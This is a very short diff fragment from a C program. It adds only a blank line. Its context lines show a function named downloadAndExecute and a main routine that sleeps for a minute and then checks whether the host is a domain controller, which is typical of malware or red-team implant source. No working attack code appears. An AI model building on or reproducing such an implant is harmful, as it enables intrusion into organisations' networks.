@@ -121,6 +121,7 @@ int downloadAndExecute()
     return 0;
 }
 
+
 int main() {
         Sleep(60000);
         if (isDomainController() == TRUE) {
